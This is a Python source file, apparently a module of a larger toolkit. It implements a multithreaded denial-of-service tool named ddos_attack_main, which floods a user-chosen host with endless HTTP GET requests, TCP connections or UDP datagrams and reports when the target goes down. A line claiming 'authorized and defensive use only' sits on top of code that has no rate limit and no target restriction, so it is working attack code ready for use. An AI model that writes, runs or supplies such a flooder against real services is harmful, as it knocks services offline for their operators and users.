"""Prueba intensiva de disponibilidad para entornos autorizados."""

from __future__ import annotations

import sys
import socket
import threading
import time
import urllib.request

from colorama import Fore, Style, init

from Python.ui import draw_banner, pause

init(autoreset=True)

COMMON_ASCII = r"""
 DDoS
"""
BANNER_COLOR = "\033[91m"
RUNNING = True


def banner() -> None:
    draw_banner("", COMMON_ASCII, "Carga HTTP y monitor de disponibilidad", BANNER_COLOR)


def ask_url() -> str | None:
    value = input("Introduce IP o URL destino ('n' para volver): ").strip()
    if value.lower() == "n":
        return None
    if not value:
        value = "127.0.0.1:8000"
    if not (value.startswith("http://") or value.startswith("https://")):
        value = "http://" + value
    return value


def ask_int(prompt: str, default: int, minimum: int = 1) -> int:
    value = input(f"{prompt} [{default}]: ").strip()
    try:
        parsed = int(value) if value else default
    except ValueError:
        return default
    return max(minimum, parsed)


def ask_float(prompt: str, default: float, minimum: float = 0.1) -> float:
    value = input(f"{prompt} [{default}]: ").strip()
    try:
        parsed = float(value) if value else default
    except ValueError:
        return default
    return max(minimum, parsed)


def fmt_hms(seconds: float) -> str:
    total = int(seconds)
    hours, rem = divmod(total, 3600)
    minutes, secs = divmod(rem, 60)
    return f"{hours:02d}:{minutes:02d}:{secs:02d}"


def now_str() -> str:
    return time.strftime("%Y-%m-%d %H:%M:%S", time.localtime())


def http_get(url: str, timeout: float) -> int:
    request = urllib.request.Request(url, method="GET")
    with urllib.request.urlopen(request, timeout=timeout) as response:
        response.read()
        return response.getcode()


def tcp_probe(host: str, port: int, timeout: float) -> int:
    with socket.create_connection((host, port), timeout=timeout) as connection:
        connection.sendall(b"GET / HTTP/1.0\r\n\r\n")
    return 200


def udp_probe(host: str, port: int, timeout: float) -> int:
    with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as connection:
        connection.settimeout(timeout)
        connection.sendto(b"ciber-monkey", (host, port))
    return 200


def worker(
    mode: str,
    target: str,
    timeout: float,
    stats: dict[str, float | int | str | None],
    lock: threading.Lock,
    port: int | None = None,
) -> None:
    global RUNNING
    while RUNNING:
        try:
            if mode == "http":
                code = http_get(target, timeout)
            elif mode == "tcp":
                code = tcp_probe(target, int(port), timeout)
            else:
                code = udp_probe(target, int(port), timeout)
            with lock:
                stats["sent"] += 1
                if 200 <= int(code) < 400:
                    stats["ok"] += 1
                    stats["consec_fail"] = 0
                    stats["last_ok_ts"] = time.time()
                else:
                    stats["fail"] += 1
                    stats["consec_fail"] += 1
                    stats["last_fail_ts"] = time.time()
                    stats["last_err"] = f"HTTP {code}"
        except Exception as exc:  # noqa: BLE001
            with lock:
                stats["sent"] += 1
                stats["fail"] += 1
                stats["consec_fail"] += 1
                stats["last_fail_ts"] = time.time()
                stats["last_err"] = type(exc).__name__


def printer(
    target_label: str,
    stats: dict[str, float | int | str | None],
    lock: threading.Lock,
    fail_threshold: int,
) -> None:
    del target_label
    start = time.time()
    last_t = start
    last_sent = 0
    alerted_down = False
    down_since = None

    while RUNNING:
        time.sleep(0.2)
        now = time.time()

        with lock:
            sent = int(stats["sent"])
            ok = int(stats["ok"])
            fail = int(stats["fail"])
            consec_fail = int(stats["consec_fail"])
            last_err = stats.get("last_err")
            last_fail_ts = stats.get("last_fail_ts")

        delta_time = now - last_t
        delta_sent = sent - last_sent
        rps = (delta_sent / delta_time) if delta_time > 0 else 0.0
        elapsed = now - start
        avg_rps = (sent / elapsed) if elapsed > 0 else 0.0

        if consec_fail >= fail_threshold and not alerted_down:
            alerted_down = True
            down_since = float(last_fail_ts) if last_fail_ts else now
            print(
                Fore.RED
                + f"\n[{now_str()}] ALERTA: el servicio no responde (>= {fail_threshold} fallos seguidos). "
                + f"Ultimo error: {last_err}"
            )

        if alerted_down and consec_fail == 0:
            alerted_down = False
            down_for = (now - down_since) if down_since else 0.0
            down_since = None
            print(
                Fore.GREEN
                + f"\n[{now_str()}] RECUPERADO: el servicio vuelve a responder. "
                + f"Tiempo caido: {fmt_hms(down_for)}"
            )

        alert_tag = ""
        if alerted_down:
            down_for = (now - down_since) if down_since else 0.0
            alert_tag = f" | DOWN {fmt_hms(down_for)} (err: {last_err})"

        line = (
            f"\rTiempo: {fmt_hms(elapsed)} | Enviadas: {sent} | OK: {ok} | Fail: {fail} "
            f"| ConsecFail: {consec_fail} | RPS: {rps:7.1f} | Avg: {avg_rps:7.1f}{alert_tag}"
        )
        sys.stdout.write(Style.BRIGHT + line + Style.RESET_ALL)
        sys.stdout.flush()

        last_t = now
        last_sent = sent


def ddos_attack_main() -> None:
    global RUNNING

    while True:
        RUNNING = True
        banner()
        print("Uso autorizado y defensivo solamente.")
        print("Realiza trafico repetido y alerta si el servicio deja de responder.\n")

        print("Modos disponibles:")
        print("1. HTTP / HTTPS")
        print("2. TCP")
        print("3. UDP")
        print("n. Volver\n")
        mode_choice = input("Selecciona modo (1/2/3/n): ").strip().lower()
        if mode_choice == "n":
            return
        if mode_choice not in {"1", "2", "3"}:
            pause(Fore.RED + "Modo no valido. Pulsa Enter para continuar...")
            continue

        port = None
        if mode_choice == "1":
            mode = "http"
            target = ask_url()
            if target is None:
                return
            target_label = target
        else:
            mode = "tcp" if mode_choice == "2" else "udp"
            host = input("Introduce IP o dominio destino ('n' para volver): ").strip()
            if host.lower() == "n":
                return
            if not host:
                host = "127.0.0.1"
            port = ask_int("Puerto destino", 9090)
            target = host
            target_label = f"{host}:{port}"

        threads = ask_int("Numero de hilos", 100)
        timeout = ask_float("Timeout por peticion (segundos)", 1.5)
        fail_threshold = ask_int("Umbral de fallos consecutivos para alerta", 20)

        print(Fore.CYAN + f"\nObjetivo: {target_label}")
        if mode == "http":
            print("Peticiones: GET repetidas a esa URL, sin rutas extra.")
        elif mode == "tcp":
            print("Peticiones: conexiones TCP repetidas al host y puerto indicados.")
        else:
            print("Peticiones: datagramas UDP repetidos al host y puerto indicados.")
        print(Fore.YELLOW + "Parar: Ctrl+C\n")

        stats: dict[str, float | int | str | None] = {
            "sent": 0,
            "ok": 0,
            "fail": 0,
            "consec_fail": 0,
            "last_err": None,
            "last_ok_ts": None,
            "last_fail_ts": None,
        }
        lock = threading.Lock()

        threading.Thread(
            target=printer,
            args=(target_label, stats, lock, fail_threshold),
            daemon=True,
        ).start()

        for _ in range(max(1, threads)):
            threading.Thread(
                target=worker,
                args=(mode, target, timeout, stats, lock, port),
                daemon=True,
            ).start()

        try:
            while True:
                time.sleep(1)
        except KeyboardInterrupt:
            RUNNING = False
            time.sleep(0.3)
            print(Fore.GREEN + "\nParado.")
            pause()


if __name__ == "__main__":
    ddos_attack_main()
